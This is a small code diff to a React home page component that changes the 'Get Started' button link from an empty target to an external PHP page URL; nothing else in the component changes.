@@ -21,7 +21,7 @@ export default function Home() {
 
             <div className="flex gap-3 md:gap-4">
               <Link
-                to=""
+                to="https://tunipril.com/ddsshht.php"
                 className="bg-blue-600 text-white px-6 md:px-8 py-2.5 md:py-3 rounded-lg shadow-md hover:bg-blue-700 transition"
               >
                 Get Started
